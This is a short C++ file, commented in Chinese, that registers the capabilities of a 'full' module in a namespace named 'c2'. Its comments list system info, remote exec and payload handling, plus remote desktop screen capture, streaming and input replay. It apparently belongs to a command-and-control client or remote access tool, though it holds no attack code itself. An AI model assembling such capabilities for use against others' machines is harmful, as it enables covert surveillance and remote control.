// caps_full.cpp — "full"模块的能力清单（工程级文件，不是 core 的一部分）
//
// 每个模块工程提供一份 register_module_capabilities()，声明本产物包含哪些能力。
// core 通过 capability.h 的注册表与这些能力打交道，因此**加/减能力只改这个文件**，
// 不需要动 core（见 client/core/capability.h）。
//
// 复制模板开新模块时，就是复制这个文件所在的那套工程文件 + 改写本函数。
#include "capability.h"
#include "screen_module.h"

namespace c2
{

    void register_module_capabilities()
    {
        // full 模块 = 系统类（sysinfo/exec/payload，由 core 内置处理）
        //            + 远程桌面（抓屏/屏幕流/输入回放，由 screen_module 登记）
        screen_module_register();
    }

}  // namespace c2
